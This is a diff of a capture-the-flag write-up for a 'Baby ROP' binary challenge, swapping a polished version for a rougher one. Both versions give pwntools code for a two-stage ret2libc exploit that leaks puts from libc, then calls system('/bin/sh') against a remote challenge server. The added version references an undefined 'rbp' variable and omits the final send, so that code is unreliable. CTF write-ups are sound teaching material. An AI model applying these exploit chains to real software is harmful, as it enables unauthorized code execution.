@@ -1,4 +1,3 @@
-Excellent writeup for the "Baby ROP" challenge! Here's a polished version with some corrections and additional explanations:
 
 ## Challenge: Baby ROP
 **Type:** Pwn/Binary Exploitation  
@@ -9,94 +8,77 @@ Excellent writeup for the "Baby ROP" challenge! Here's a polished version with s
 We're given a binary `pwn_baby_rop` that prompts for input. Basic interaction shows no obvious functionality, so we analyze it with Ghidra.
 
 ### Vulnerability Discovery
-Ghidra reveals the use of the unsafe `gets()` function for input handling. This creates a classic buffer overflow vulnerability that we can exploit with a ret2libc attack.
+We see that for getting the input the unsafe gets functions is used:
+![alt text](image.png)
+
+Seeing that it means that we can craft a ret2libc attack.
 
 ### Exploitation Strategy: Two-Stage ret2libc
 
-#### Stage 1: Libc Address Leak
-Since ASLR randomizes libc addresses, we first need to leak a known function address from the Global Offset Table (GOT).
+To do that, first we would need to leak an address from libc. We will do that for puts by getting the puts got address and the puts plt address.
+After doing that we will simply abuse the buffer overflow vulnerability by leaking the puts adress in libc.
+Also, after calling leaking the puts address we will return to the main function so we can be asked for input again, now knowing an address from libc.
 
+The first part of the exploit will look like this:
 ```python
 from pwn import *
-
-# Setup
 env = {"LD_PRELOAD": "./libc6_2.31-0ubuntu8_amd64.so"}
+#io = process("./pwn_baby_rop", env=env)
 io = remote("34.159.211.30", 32627)
-# io = process("./pwn_baby_rop", env=env)  # For local testing
-
 io.recvuntil("black magic.\n")
+#gdb.attach(io)
 
-# ROP gadgets and addresses
-pop_rdi = 0x00401663  # pop rdi; ret
-puts_got = 0x404018   # puts GOT entry
-puts_plt = 0x401060   # puts PLT entry
-main = 0x40145C       # main function address
-
-# Stage 1: Leak puts address from libc
-payload = b"A" * 256  # Buffer overflow padding
-payload += b"B" * 8   # RBP overwrite
-payload += p64(pop_rdi)    # Set up argument
-payload += p64(puts_got)   # Address to leak (puts GOT)
-payload += p64(puts_plt)   # Call puts to print the address
-payload += p64(main)       # Return to main for second stage
-
+# 1st stage
+pop_rdi = 0x00401663
+puts_got = 0x404018
+puts = 0x401060
+main = 0x40145C
+payload = b""
+payload += b"A" * 256
+payload += b"B" * 8
+payload += p64(pop_rdi)
+payload += p64(puts_got)
+payload += p64(puts)
+payload += p64(main)
 io.sendline(payload)
-
-# Parse the leaked address
 puts_addr = io.recvline()[:-1].ljust(8, b"\x00")
 puts_addr = u64(puts_addr)
-log.info("Leaked puts address: " + hex(puts_addr))
+log.info("puts: " + hex(puts_addr))
 ```
 
-#### Stage 2: Libc Database Lookup and System Call
-Using the leaked puts address, we identify the libc version through libc database searches. The offsets help us calculate other function addresses.
+In the second stage we will need to first find the libc version so we could know the offsets. To do that we can search on libc database website and find:
+![alt text](image-1.png)
 
+Now, as we know the offsets we can first find the libc base addr, then find the system call and also the /bin/sh string address.
+
+The second part of the exploit will look like:
 ```python
-# Libc offsets (found via libc database)
+# 2nd stage
 puts_offset = 0x0875a0
 system_offset = 0x055410
-bin_sh_offset = 0x1b75aa
-
-# Calculate addresses
+bin_sh_offset =  0x1b75aa
 libc_base = puts_addr - puts_offset
-system_addr = libc_base + system_offset
-bin_sh_addr = libc_base + bin_sh_offset
-
-log.info("Libc base: " + hex(libc_base))
-log.info("System address: " + hex(system_addr))
-log.info("/bin/sh address: " + hex(bin_sh_addr))
-
-# Stage 2: Call system("/bin/sh")
-simple_ret = 0x0040101a  # ret gadget for stack alignment
-
-payload = b"A" * 256     # Buffer overflow
-payload += b"B" * 8      # RBP overwrite
-payload += p64(pop_rdi)  # Setup argument register
-payload += p64(bin_sh_addr)  # "/bin/sh" string address
-payload += p64(simple_ret)   # Stack alignment
-payload += p64(system_addr)  # Call system()
-
-io.sendline(payload)
-io.interactive()  # Get shell access
+system = libc_base + system_offset
+bin_sh = libc_base + bin_sh_offset
+log.info("libc_base: " + hex(libc_base))
+log.info("system: " + hex(system))
+log.info("bin_sh: " + hex(bin_sh))
+simple_ret = 0x0040101a
+payload = b"A" * 256
+payload += p64(rbp)
+payload += p64(pop_rdi)
+payload += p64(bin_sh)
+payload += p64(simple_ret)
+payload += p64(system)
 ```
 
-### Complete Exploit### Key Learning Points:
+And that is how the system function will be called with /bin/sh arg and we pwn the binary.
 
+### Key Learning Points:
 1. **Buffer Overflow Basics**: Using `gets()` creates predictable overflow conditions
-2. **ret2libc Technique**: Bypassing NX bit by reusing existing libc functions
+2. **ret2libc Technique**: Bypassing NX bit by reusing existing libc functions  
 3. **Address Leaking**: Using GOT/PLT to leak randomized addresses
 4. **ROP Chains**: Chaining gadgets to control program execution
-5. **Stack Alignment**: Modern systems require 16-byte stack alignment for some functions
-6. **Libc Database**: Using leaked addresses to identify exact libc version
-
-### Tools Used:
-- **Ghidra**: Static analysis and reverse engineering
-- **pwntools**: Exploit development framework
-- **ROPgadget**: Finding ROP gadgets
-- **Libc database**: Identifying libc version from leaked addresses
-
-### Mitigation Bypassed:
-- **NX bit**: Executed existing code instead of injecting shellcode
-- **ASLR**: Leaked addresses to calculate randomized locations
+5. **Libc Database**: Using leaked addresses to identify exact libc version
 
 This is a classic introduction to modern binary exploitation techniques!
